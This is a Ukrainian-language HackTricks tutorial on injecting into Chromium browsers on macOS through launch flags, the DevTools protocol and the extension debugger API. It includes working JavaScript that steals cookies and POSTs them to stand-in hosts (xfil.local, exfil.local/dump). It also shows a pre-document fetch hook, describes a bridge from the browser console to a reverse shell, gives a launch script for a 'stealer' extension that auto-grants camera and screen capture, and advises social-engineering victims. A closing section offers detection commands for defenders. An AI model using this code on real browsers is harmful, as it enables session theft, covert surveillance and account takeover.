# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Браузери на основі Chromium, такі як Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi та Opera, використовують однакові перемикачі командного рядка, файли налаштувань і інтерфейси автоматизації DevTools. У macOS будь-який користувач із доступом до GUI може завершити наявний сеанс браузера та повторно відкрити його з довільними прапорцями, розширеннями або кінцевими точками DevTools, які працюють із entitlements цільового користувача.

#### Запуск Chromium із користувацькими прапорцями в macOS

macOS підтримує лише один екземпляр UI для кожного профілю Chromium, тому для інструментування зазвичай потрібно примусово закрити браузер (наприклад, за допомогою `osascript -e 'tell application "Google Chrome" to quit'`). Зловмисники зазвичай повторно запускають його через `open -na "Google Chrome" --args <flags>`, щоб інжектувати аргументи без зміни app bundle. Обгортання цієї команди в користувацький LaunchAgent (`~/Library/LaunchAgents/*.plist`) або login hook гарантує повторний запуск зміненого браузера після перезавантаження чи виходу із системи.

#### Прапорець `--load-extension`

Прапорець `--load-extension` автоматично завантажує unpacked extensions (шляхи, розділені комами). Поєднайте його з `--disable-extensions-except`, щоб блокувати легітимні розширення та змусити працювати лише ваш payload. Шкідливі розширення можуть запитувати дозволи з високим рівнем впливу, такі як `debugger`, `webRequest` і `cookies`, щоб отримати доступ до протоколів DevTools, змінювати CSP-заголовки, знижувати рівень HTTPS або ексфільтрувати session material одразу після запуску браузера.

#### Прапорці `--remote-debugging-port` / `--remote-debugging-pipe`

Ці перемикачі відкривають Chrome DevTools Protocol (CDP) через TCP або pipe, щоб зовнішні інструменти могли керувати браузером. Google зафіксувала широкомасштабне зловживання цим інтерфейсом з боку infostealer, і починаючи з Chrome 136 (березень 2025 року) ці перемикачі ігноруються для default profile, якщо браузер не запущено з нестандартним `--user-data-dir`. Це забезпечує App-Bound Encryption для реальних профілів, але зловмисники все ще можуть створити новий profile, змусити жертву автентифікуватися всередині нього (за допомогою phishing/triage assistance) і викрасти cookies, tokens, device trust states або WebAuthn registrations через CDP.<sup>[5]</sup>

#### Прапорець `--user-data-dir`

Цей прапорець перенаправляє весь профіль браузера (History, Cookies, Login Data, Preference files тощо) до шляху, контрольованого зловмисником. Він є обов'язковим під час поєднання сучасних збірок Chrome із `--remote-debugging-port`, а також ізолює змінений профіль, щоб можна було розмістити попередньо заповнені файли `Preferences` або `Secure Preferences`, які вимикають security prompts, автоматично встановлюють розширення та змінюють default schemes.

#### Прапорець `--use-fake-ui-for-media-stream`

Цей перемикач обходить запит дозволу на камеру/мікрофон, тому будь-яка сторінка, яка викликає `getUserMedia`, одразу отримує доступ. Поєднайте його з такими прапорцями, як `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` або командами CDP `Browser.grantPermissions`, щоб безшумно захоплювати аудіо/відео, ділитися екраном або проходити WebRTC permission checks без взаємодії з користувачем.

## Поширені в реальних атаках способи доставки та повторного запуску

Зловживання CDP зазвичай є етапом **post-exploitation**, а не початковим payload. Нещодавня кампанія в macOS, націлена на розробників, використовувала отруєну фазу збірки Xcode **`Run Script`** (`PBXShellScriptBuildPhase`), завдяки чому код виконувався лише тоді, коли жертва **збирала** проєкт, а не просто клонувала чи відкривала його. Після першого виконання malware також заражав інші дерева `.xcodeproj`, додавав шкідливі Git `pre-commit` hooks і шукав додаткові Xcode-проєкти в ZIP-архівах.<sup>[3]</sup>

Для зловживань Chromium це важливо, оскільки зловмиснику не потрібно змінювати binary браузера. Натомість короткоживучий build-phase / `osascript` stager може встановити **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher тощо), який щоразу повторно відкриватиме легітимний браузер із прапорцями, контрольованими зловмисником, коли користувач його запускає.<sup>[3]</sup>

> [!TIP]
> На endpoints розробників перевіряйте файли `.pbxproj`, `.git/hooks/pre-commit` і ZIP-архіви, що містять `.xcodeproj`, на наявність неочікуваних `curl`, `osascript`, `xxd`, вкладеного `base64` або логіки повторного запуску Chrome.

## Зловживання Remote Debugging і протоколом DevTools

Після повторного запуску Chrome зі спеціальними `--user-data-dir` і `--remote-debugging-port` можна під'єднатися через CDP (наприклад, за допомогою `chrome-remote-interface`, `puppeteer` або `playwright`) і автоматизувати workflows із високими привілеями:

- **Крадіжка cookie/session:** `Network.getAllCookies` і `Storage.getCookies` повертають HttpOnly-значення, навіть коли App-Bound encryption зазвичай блокувала б доступ до файлової системи, оскільки CDP просить запущений браузер розшифрувати їх.
- **Підміна permission:** `Browser.grantPermissions` і `Emulation.setGeolocationOverride` дають змогу обходити запити дозволів на камеру/мікрофон (особливо в поєднанні з `--use-fake-ui-for-media-stream`) або підробляти security checks, що залежать від місцезнаходження.
- **Інжекція keystroke/script:** `Runtime.evaluate` виконує довільний JavaScript всередині активної вкладки, уможливлюючи викрадення credentials, зміну DOM або інжекцію persistence beacons, які зберігаються після навігації.<sup>[1]</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` і `Fetch.enable` перехоплюють автентифіковані requests/responses у реальному часі, не залишаючи артефактів на диску.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Оскільки Chrome 136 блокує CDP у профілі за замовчуванням, копіювання наявного каталогу `~/Library/Application Support/Google/Chrome` жертви до staging-шляху більше не дає розшифрованих cookies. Натомість змусьте користувача пройти автентифікацію в інструментованому профілі за допомогою social engineering (наприклад, під виглядом «корисної» сесії підтримки) або перехоплюйте MFA-токени під час передавання через керовані CDP мережеві hooks.<sup>[5]</sup>

### Ланцюжок CDP Backdoor у стилі XCSSET

Практичний шаблон malware:

1. Перезапускайте userland implant або wrapper щоразу після запуску Chrome.
2. Запускайте легітимний browser із `--remote-debugging-port=<port>` і, починаючи з Chrome 136+, зазвичай із парним непереносним `--user-data-dir=<dir>`.
3. Запускайте helper, який підключається до локального CDP WebSocket і реєструє pre-document hook за допомогою `Page.addScriptToEvaluateOnNewDocument`.<sup>[2]</sup>

Цей helper може інжектити JavaScript **до** запуску коду сайту, що ідеально підходить для hooking `window.fetch`, `XMLHttpRequest`, wallet providers або autofill flows без зміни файлів на диску.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Потужніший варіант перетворює браузер на **міст до команд host**: ін'єктований JavaScript виводить `console.log` із маркером-роздільником, локальна допоміжна програма відстежує `Runtime.consoleAPICalled`, видаляє маркер, виконує решту через host shell (наприклад, Go `exec.Command`) і повертає stdout/stderr через WebSocket атакувальника. Це перетворює виконання скриптів на рівні вкладки на переважно безфайловий reverse shell.<sup>[3]</sup>

## Ін'єкція через Debugger API на основі розширення

Дослідження 2023 року "Chrowned by an Extension" продемонструвало, що шкідливе розширення, яке використовує API `chrome.debugger`, може під'єднатися до будь-якої вкладки й отримати ті самі можливості DevTools, що й `--remote-debugging-port`.<sup>[6]</sup> Це порушує початкові припущення щодо ізоляції (розширення залишаються у власному контексті) та уможливлює:

- Приховане викрадення cookie і облікових даних за допомогою `Network.getAllCookies`/`Fetch.getResponseBody`.
- Зміну дозволів сайтів (камери, мікрофона, геолокації) та обхід security interstitial, що дає змогу phishing-сторінкам імітувати діалогові вікна Chrome.
- Маніпуляції «на шляху» з TLS-попередженнями, завантаженнями або запитами WebAuthn шляхом програмного керування через `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` або `Security.handleCertificateError`.

Завантажте розширення за допомогою `--load-extension`/`--disable-extensions-except`, щоб не вимагати взаємодії з користувачем. Мінімальний фоновий скрипт, який використовує цей API для атаки, виглядає так:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Розширення також може підписуватися на події `Debugger.paused`, щоб читати змінні JavaScript, змінювати inline-скрипти або встановлювати власні breakpoint-и, які зберігаються після навігації. Оскільки все виконується всередині GUI-сесії користувача, Gatekeeper і TCC не активуються, що робить цю техніку ідеальною для malware, яке вже отримало виконання в контексті користувача.<sup>[6]</sup>

## Виявлення та пошук

- Створюйте alert-и для Chromium-браузерів, запущених із параметрами `--remote-debugging-port`, `--remote-debugging-pipe` або підозрілим `--user-data-dir`, особливо коли батьківським процесом є `bash`, `sh`, `osascript`, `xcodebuild` або helper LaunchAgent.
- Шукайте короткі ланцюжки, у яких helper відкриває локальний CDP WebSocket, реєструє `Page.addScriptToEvaluateOnNewDocument`, а потім встановлює довготривале вихідне WebSocket/HTTPS-з'єднання.
- Виявляйте console-to-shell bridges, зіставляючи активність браузера `Runtime.consoleAPICalled` із дочірніми shell або helper-процесами, що виконують команди, надані attacker-ом.
- На Mac-ах розробників перевіряйте записи `PBXShellScriptBuildPhase` у `.pbxproj`, Git hooks `pre-commit`, relauncher-и Dock/login item і Xcode-проєкти, що містяться в ZIP-архівах, на предмет встановлення browser wrapper-ів.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Інструменти

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Автоматизує запуск Chromium із payload extensions і надає інтерактивні CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Схожий інструмент, орієнтований на перехоплення трафіку та browser instrumentation для операторів macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Бібліотека Node.js для створення скриптів, які отримують дані через Chrome DevTools Protocol (cookies, DOM, permissions), коли екземпляр із параметром `--remote-debugging-port` уже запущено.

### Приклад
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Знайдіть більше прикладів у посиланнях на інструменти.

## Посилання

- [1] [Chrome DevTools Protocol - домен Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - домен Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: детальний аналіз останньої версії XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) у X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Зміни перемикачів віддаленого debugging для підвищення security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: зловживання Chrome DevTools Protocol через Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
